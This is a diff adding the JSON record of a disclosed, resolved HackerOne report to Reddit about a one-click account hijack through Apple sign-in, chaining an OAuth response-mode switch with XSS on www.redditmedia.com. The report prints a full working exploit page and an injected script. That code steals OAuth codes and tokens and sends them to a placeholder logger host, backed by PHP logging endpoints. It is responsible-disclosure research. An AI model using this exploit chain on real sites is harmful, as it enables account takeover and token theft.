@@ -1,0 +1,172 @@
+{
+  "id": 1567186,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY3MTg2",
+  "url": "https://hackerone.com/reports/1567186",
+  "title": "One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-05-12T14:03:26.547Z",
+  "submitted_at": "2022-05-12T14:03:26.715Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fransrosen",
+    "url": "/fransrosen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35710,
+    "url": "https://hackerone.com/reddit",
+    "handle": "reddit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Reddit",
+      "twitter_handle": "reddit",
+      "website": "https://www.reddit.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-08-02T15:13:53.849Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-08-02T15:00:16.189Z",
+  "team_member_agreed_on_going_public_at": "2022-08-02T15:13:53.700Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\n# Description\n\nI've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.\n\nThe way it works is this:\n\n1. Attacker prepares a `state`-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.\n2. Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with `www.redditmedia.com`, which is an intentional sandbox but with a fun quirk, it uses `window.name` of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.\n3. The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the `state`-value that the attacker set. Also, the `response_type` is modified from `code` to `code+id_token` and the `response_mode` to `fragment`. This is the second important part why we can steal the code, since Reddit uses `response_mode=web_message` live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. **Reddit is not expecting to get any sensitive tokens in the URL fragment.** Also, the `redirect_uri` set in the OAuth-application in Apple for Reddit is allowing `https://reddit.com` only as the return page. This is something you need to remove, or point elsewhere. When you're using `response_mode=web_message`, the `redirect_uri` doesn't really matter what it is set to, since the whole origin of `https://reddit.com` will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.\n4. Victim clicks the link from the attacker page, will go through \"sign-in with Apple\" for Reddit, but with the attacker's `state`-parameter. When the login process is completed, the URL of the main page becomes `https://reddit.com/#state=xxx&code=xxx&access_token=xx`.\n5. The XSS on `www.redditmedia.com` in the first window, which has the same domain as the iframe, will be allowed to ask about the `window.name` of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.\n\nHere's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:\n\n{F1726830}\n\nAnd here's a link for testing:\n\n```\nhttps://fransrosen.com/reddit-hijack-424342.html\n```\n\n# Technical details\n\nHere's the HTML of the malicious page:\n\n```html\n<html>\n<style>pre { word-break: break-word; white-space: pre-wrap; }</style>\n<body>\n<div id=\"start\">\nAttacker, enter your Apple ID-OAuth URL when trying to <a href=\"https://reddit.com\" target=\"_blank\">sign in to Reddit here</a>:<br />\n<input id=\"state\">\n<button onclick=\"launch(extractstate(document.getElementById('state').value), true)\">Generate a victim URL with attacker's state</button>\n</div>\n\n\n<div id=\"fr\"></div>\n\n<script>\nvar inj, monitor;\nfunction extractstate(st) {\n    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;\n}\nfunction startmonitor(st) {\n    history.pushState('/','/',location.pathname + '?monitor&state=' + st)\n    monitor = setInterval(function() {\n        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {\n            if (e.length) {\n                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';\n                var p = document.createElement('pre');\n                p.innerText = 'opener.postMessage(\\'' + unescape(e.trim()) + '\\',\"*\");';\n                document.getElementById('fr').appendChild(p)\n                clearInterval(monitor);\n            }\n        });\n    }, 2000);\n}\nfunction launch(st, showonly) {\n    if (showonly) {\n        history.pushState('/','/',location.pathname + '?state=' + st)\n        document.getElementById('fr').innerText = 'Send this link to victim: ';\n        var p = document.createElement('pre');\n        p.innerText = location.href;\n        document.getElementById('fr').appendChild(p);\n        startmonitor(st);\n    } else {\n        document.getElementById('fr').innerHTML = '<iframe src=\"https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '\" frameborder=0 style=\"width: 500px; height: 300px\"></iframe>';\n    }\n    document.getElementById('start').innerHTML = '';\n}\nif (location.search && location.search.split('state=')[1].split('&')[0]) {\n    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);\n}\nwindow.onmessage = function(e) {\n    if (e.data === 'stopinject') {\n        console.log('frame injected');\n        clearInterval(inj)\n    }\n    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {\n        payload = JSON.parse(e.data);\n        data = payload.hash.replace('state=state=', 'state=');\n        var state = data.split('state=')[1].split('&')[0];\n        var code = data.split('code=')[1].split('&')[0];\n        var id_token = data.split('id_token=')[1].split('&')[0];\n        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});\n\n        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';\n        var p = document.createElement('pre');\n        p.innerText = payload;\n        document.getElementById('fr').appendChild(p);\n\n        var s = document.createElement('img');\n        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;\n        document.body.appendChild(s);   \n    }\n}\n\n</script>\n\n\n</body>\n</html>\n```\n\nWhat this page will do is:\n\n1. Ask the attacker to prepare the `state`-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.\n\n{F1726829}\n\n{F1726831}\n\n2. Load the `https://www.redditmedia.com` with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.\n3. The GTM-script will load, it looks like this:\n\n```html\n<script>var b, x;\nvar state = parent.location.href.substr(location.href.indexOf('state='));\nvar d = document.createElement('div');\nif (!window.inited) {\n  window.inited = true;\nd.innerHTML = '<a href=\"#\" onclick=\"b=window.open(\\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\\');\">Click here to hijack Apple access-token for Reddit</a>';\nparent.document.children[parent.document.children.length - 1].appendChild(d);\nif(top!==parent.window) top.postMessage('stopinject', '*');\nparent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };\nx = setInterval(function() {\nif(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {\n  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();\n  clearInterval(x);\n};\n\n}, 500);\n}\n</script>\n```\n\n4. This javascript will render the \"Click here\"-link:\n\n{F1726833}\n\nIt will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the `frames[1].window.name`, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains `code`, the value will be sent to the attacker main window through this frame. \n5. The attacker's main window will listen for a postMessage containing `code` and will show the state+code in the window. The page will then load an external logging-URL with the payload.\n\n{F1726835}\n\n6. The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:\n\n{F1726836}\n\n## Logging endpoints\n\nI've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.\n\n`https://USE-YOUR-OWN-LOGGER/reddit/log.php` looks like this:\n\n```php\n<?php\n\nif (isset($_SERVER['QUERY_STRING'])) {\n\tfile_put_contents('r.log', $_SERVER['QUERY_STRING'].\"\\n\", FILE_APPEND);\n}\n```\n\nAnd `https://USE-YOUR-OWN-LOGGER/reddit/parse.php` looks like this:\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Content-type: text/plain\");\n\n$key = @$_GET['q'];\nif (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }\n$data = explode(\"\\n\", file_get_contents('r.log'));\nforeach($data as $line) {\n\tif (strpos($line, $key) !== false) {\n\t\techo $line . \"\\n\";\n\t\tdie;\n\t}\n}\n```\n\n\n# Mitigation\n\n1. Remove fragment part when location is sent to www.redditmedia.com or any other party.\n2. Restrict your `redirect_uri` of Apple-ID to something that does not load a domain that could run arbitrary javascript.\n\n## Impact\n\nAttacker can sign in as the victim. There's minimal interaction needed, only one click.\n\nThis took quite some time to get built :) I hope you'll like it!\n\nRegards,\nFrans",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1726829,
+      "file_name": "Screen_Shot_2022-05-12_at_15.52.53.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jrk3eil8v72jaz2md1kjaooctu6z?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.52.53.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.52.53.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e9861bde0b3df518b3733afc50046babd9efea88ed4a8cbc2591aa227cc2237",
+      "file_size": 37462,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1726830,
+      "file_name": "reddit-hijack.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gw9cy6qzhcjmuibovzaxsqdtrjrk?response-content-disposition=attachment%3B%20filename%3D%22reddit-hijack.mp4%22%3B%20filename%2A%3DUTF-8%27%27reddit-hijack.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=87568c88ed8a19eb183047424c5f9af575084d76ad738aee63b7f7b1778315bf",
+      "file_size": 9701743,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 1726831,
+      "file_name": "Screen_Shot_2022-05-12_at_15.52.59.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vgsdqpaaml5q8kvhyrg74ksuo7ea?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.52.59.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.52.59.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da5bd7304eb6f5bda64cbf38e116c4b8f1ecf1c5edefe7d2d6f8848ebe03bf8c",
+      "file_size": 32956,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1726833,
+      "file_name": "Screen_Shot_2022-05-12_at_15.54.23.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b0mce3rvv3c4sj4q6i2ak7ef6j0n?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.54.23.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.54.23.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=85a4913a13443ff037228ebe0b9782dbb020110a2f62bd5e8e2a1fbbaa3c9da1",
+      "file_size": 31542,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1726835,
+      "file_name": "Screen_Shot_2022-05-12_at_16.00.54.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0c7wp5yo4mofb524hukxlu09m6x4?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_16.00.54.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_16.00.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=155f8c4dd1d3f8a009cb3cd599e02756a824d04374dabe19b44c6fe8992ea5ca",
+      "file_size": 60604,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1726836,
+      "file_name": "Screen_Shot_2022-05-12_at_16.00.32.png",
